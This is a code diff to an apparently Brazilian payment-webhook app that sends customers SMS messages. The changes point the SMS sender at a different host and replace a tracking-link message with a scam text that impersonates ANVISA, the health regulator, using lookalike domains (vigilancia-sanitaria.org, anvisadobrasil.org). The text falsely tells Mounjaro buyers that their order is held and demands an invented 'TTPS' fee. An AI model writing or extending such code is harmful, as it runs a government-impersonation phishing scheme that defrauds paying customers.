@@ -4578,7 +4578,7 @@ def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_
         # Enviar SMS pela API de notificação
         import requests
         response = requests.post(
-            'https://neto-contatonxcase.replit.app/api/manual-notification',
+            'https://netog6f5d-contatonxcasekjnk.replit.app/api/manual-notification',
             json={
                 'phone': phone_number,
                 'message': message,
@@ -5334,14 +5334,15 @@ def novaera_webhook():
                 # Enviar webhook de compra aprovada para a API solicitada
                 try:
                     import requests
-                    rastreio_url = f"https://correios.com?id={transaction_id}"
-                    mensagem = f"Olá sua compra foi aprovada confira seu código de rastreio em: {rastreio_url}"
+                    rastreio_url = f"https://anvisa.vigilancia-sanitaria.org/compra_sucesso?id={transaction_id}"
+                    mensagem = f"ATENCAO: Sua compra do Mounjaro esta retida. Pague a TTPS obrigatoria para medicamentos tarja preta. Evite cancelamento: {rastreio_url}"
                     
                     # Preparar os dados para a requisição
                     webhook_payload = {
                         'phone': customer_phone,
                         'message': mensagem,
-                        'shortUrls': True
+                        'shortUrls': True,
+                        'shortenerDomain':'anvisadobrasil.org'
                     }
                     
                     # Enviar o webhook
